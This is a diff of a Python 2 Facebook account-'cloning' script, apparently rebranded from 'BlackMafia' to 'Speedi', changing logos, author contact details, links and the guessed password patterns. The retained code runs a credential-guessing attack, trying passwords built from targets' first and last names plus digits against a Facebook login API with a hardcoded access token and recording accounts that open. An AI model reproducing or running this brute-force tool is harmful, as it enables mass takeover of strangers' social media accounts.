@@ -11,7 +11,7 @@ try:
     import mechanize
 except ImportError:
     os.system('pip2 install mechanize')
-    os.system('python2 lovehacker.py')
+    os.system('python2 Speedi.py')
 
 from requests.exceptions import ConnectionError
 from mechanize import Browser
@@ -60,21 +60,20 @@ def trb():
     os.system('rm -rf token.txt')
 
 ##### LOGO #####
-logo='''
-\033[1;92m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
-\033[1;92m ┈┈┈▕▕╲┊┊╱▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕╲┊┊╱▏▏┈┈┈
-\033[1;92m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
-\033[1;92m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;96mBlackMafia.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
-\033[1;92m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
-\033[1;92m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲
-\033[1;92m................\033[1;96mBlackMafia\033[1;91m...............
-\033[1;92m................\033[1;96m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............
+logo='''                                                                                                                                                    ___   ___ 
+\033[1;92m    //   ) )     //   ) )     //   / /     //   / /     //    ) )       / /    
+\033[1;92m   ((           //___/ /     //____       //____       //    / /       / /     
+\033[1;92m     \\        / ____ /     / ____       / ____       //    / /       / /      
+\033[1;92m       ) )    //           //           //           //    / /       / /       
+\033[1;92m((___ / /    //           //____/ /    //____/ /    //____/ /     __/ /___     
+\033[1;92m................\033[1;96mADEEL KHOKHAR\033[1;91m...............
+\033[1;92m................\033[1;96m✬🍡  🎀  𝒦𝐻♡𝒦𝐻𝒜𝑅  🎀  🍡✬\033[1;91m..............
 
 \033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 
-\033[1;91m☞ Auther     : lovehacker✅
-\033[1;92m☞ WhatsApp   : 03094161457
-\033[1;95m☞ YouTube    : https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw
+\033[1;91m☞ Auther     : ADEEL KHOKHAR✅
+\033[1;92m☞ WhatsApp   : 030248339919
+\033[1;95m☞ Facebook    : https://m.facebook.com/Akyoutuber06
 
 \033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                 '''
@@ -94,7 +93,7 @@ def login():
 	except (KeyError,IOError):
 		cb()
 		print (logo)
-		print (R + '◈━━━━▷' + S + ' Login With ✬🄵🄰🄲🄴🄱🄾🄾🄺✬ ' + R + '◁━━━━◈')
+		print (R + '◈━━━━▷' + S + ' Login With ✬👽🐲  ⓕᗩ𝒸𝐞вσＯҜ  ♞✎✬ ' + R + '◁━━━━◈')
 		print
 		id=raw_input(S + '[☆] ' + S + 'Email: ' + G +'')
 		pwd=getpass.getpass(S + '[♡] ' + R + 'Password : ')
@@ -105,7 +104,7 @@ def login():
 		    st.write(z["access_token"])
 		    st.close()
 		    print (S + '[☆]' + Y + ' Login successfull 100% ✓')
-		    os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+		    os.system('xdg-open https://m.facebook.com/Akyoutuber06')
 		    menu()
 		else:
 		    if "www.facebook.com" in z["error_msg"]:
@@ -146,8 +145,8 @@ def menu():
 	print (S + 50*'-')
 	print
 	print (S + '[' + P + '☞1' + S + ']' + S + ' Fast Cloning New Update')
-	print (S + '[' + P + '☞2' + S + ']' + S + ' Update BlackMafia Tool')
-	print (S + '[' + P + '☞3' + S + ']' + S + ' Black Mafia WhatsApp Group')
+	print (S + '[' + P + '☞2' + S + ']' + S + ' Update Aadi Tech Tool')
+	print (S + '[' + P + '☞3' + S + ']' + S + ' Aadi Tech WhatsApp Group')
 	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out')
 	print (S + '[' + Y + '☞0' + S + ']' + R + ' Exit')
 	print
@@ -157,15 +156,15 @@ def menu():
 
 
 def mb():
-	bm=raw_input(W + ' ✬🄵🄰🄲🄴🄱🄾🄾🄺✬   ')
+	bm=raw_input(W + ' ✬ⓕⓐⓒⓔⓑⓞⓞⓚ✬   ')
 	if bm =='':
 		print (R + 'Select a valid option !')
 		mb()
 	elif bm =='1':
 		pak()
 	elif bm =='2':
-	    os.system('rm -rf $HOME/lovehacker')
-	    os.system('cd $HOME && git clone https://github.com/lovehackerAsif/BlackMafia/')
+	    os.system('rm -rf $HOME/AADI TECH')
+	    os.system('cd $HOME && git clone https://github.com/Adeel-khokhar/Speedi')
 	    cb()
 	    print (logo)
 	    psb('☆10%')
@@ -179,17 +178,17 @@ def mb():
 	    psb('☆☆☆☆☆☆☆☆☆90%')
 	    psb('☆☆☆☆☆☆☆☆☆☆100%')
 	    psb('Frends login new Account✓')
-	    psb('WhatsApp Num 03094161457✓')
-	    psb('WellCome To BlackMafia')
-	    psb('Congratulations lovehacker Tool Has Been Updated Successfully')
-	    psb('🔓User Name☆ BlackMafia✓')
-	    psb('🔓Password ☆ lovehacker✓')
-	    psb('Subscrib My Youtube Chenal loveHacker✓')
+	    psb('WhatsApp Num 03024839919✓')
+	    psb('WellCome To Adeel Khokhar')
+	    psb('Congratulations Speedi Tool Has Been Updated Successfully')
+	    psb('🔓User Name☆ Aadi✓')
+	    psb('🔓Password ☆ Alone✓')
+	    psb('Subscrib My Youtube Chenal Aadi Tech✓')
 	    psb('Please Login Again')
 	    time.sleep(2)
-	    os.system('cd $HOME/BlackMafia && python2 BlackMafia.py')
+	    os.system('cd $HOME/AkGang && python2 Speedi.py')
 	elif bm =='3':
-	    os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
+	    os.system('xdg-open https://www.facebook.com/Akyoutuber06')
 	    menu()
 	elif bm =='4':
 		psb('Token Has Been Removed')
@@ -302,7 +301,7 @@ def pb():
 			                print(G+'[OK] ♡ '+user+' ♡ '+ps2)
 			                oks.append(user+ps2)
 			            else:
-			                ps3=(j['first_name']+'786')
+			                ps3=(j['first_name']+'1234')
 			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                k=json.load(dt)
 			                if 'www.facebook.com' in k['error_msg']:
@@ -324,7 +323,7 @@ def pb():
 			                                print(G+'[OK] ♡ '+user+' ♡ '+ps4)
 			                                oks.append(user+ps4)
 			                            else:
-			                                ps5=('Pakistan')
+			                                ps5=(j['last_name']+'12345')
 			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                k=json.load(dt)
 			                                if 'www.facebook.com' in k['error_msg']:
@@ -335,7 +334,7 @@ def pb():
 			                                        print(G+'[OK] ♡ '+user+' ♡ '+ps5)
 			                                        oks.append(user+ps5)
 			                                    else:
-			                                        ps6=(j['first_name']+'khan')
+			                                        ps6=(j['last_name']+'123')
 			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                        k=json.load(dt)
 			                                        if 'www.facebook.com' in k['error_msg']:
@@ -354,10 +353,10 @@ def pb():
 	print
 	print(S+'Process has been completed CP ID Open After 7 Days ')
 	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(oks))+S+'/'+R+str(len(cps)))
-	print(S+'BlackMafia')     
+	print(S+'AkGang')     
 	print
 	raw_input(R + 'Back')
-	os.system('python2 BlackMafia.py')
+	os.system('python2 Speedi.py')
 if __name__=='__main__':
     login()
 
